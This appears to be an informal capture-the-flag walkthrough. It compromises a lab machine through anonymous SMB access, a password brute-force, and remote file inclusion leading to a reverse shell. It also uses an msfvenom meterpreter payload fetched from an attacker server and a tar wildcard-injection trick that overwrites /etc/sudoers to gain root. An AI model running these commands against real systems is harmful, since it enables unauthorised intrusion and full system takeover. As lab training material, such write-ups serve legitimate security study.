///// now its time to check out the anonymous share \\\\\


smbclient //IP/anonymous -U anonymous
checking out the logs we got the password list 

now we have our username and a list of possible passwords, its time to fire up burpsuite

After running burpsuite intruder with the password list, the only one with a 302 redirect was --->    cyborg007haloterminator

after logging into his email there was a file with his password for his smb share

after checking out his notes/important.txt we are given a new directory to enumerate :    ----->    /45kra24zxs28v3yd


after enumerating this directory with gobuster again we find the /administator login to which is vulnerable to remote file inclusion letting us get a reverse shell on the server


so a quick download from pentestmonkey's rev_shell.php and an edit in the file to place our IP in there and were onto the next step of what are some good RFI extentions


now we just have to serve the file on our side with python3 -m http.server 8080


45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=

after the '=' we have to put the path to our payload we have on the server and set up the netcat listener on the port we chose

nc -lnvp 1234

connection recieved! Hell yeah! alright, this shell is terrible, time for some meterpreter

generate a linux payload with msfvenom like so:
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="IP" LPORT="port" -f elf > whatever.elf

now server another python server the same way and wget the file into the /tmp directory because it is world writeable

##### keep in mind we should not close any of the netcat connections made leave all listeners open #######

now we have a better shell, simply spawn a tty shell with python : 
python -c 'import pty; pty.spawn("/bin/sh")'
then type 'bash' for a user shell with a path

now we should enumerate the system with linpeas.sh 

doing so we dont really find much other than we can do some tar stuff, so technically anything in the directory getting tar'd will be ran

after some reading I decided the best route would be to see if i can overwrite the sudoers file with a ALL-(root) NOPASS: ALL for www-data

so lets echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > esc.sh

then some checkpoint stuff

echo "/var/www/html" > "--checkpoint-action=exec=sh esc.sh"
echo "/var/www/html" > --checkpoint=1

then we just have to set up out listener and wait!!
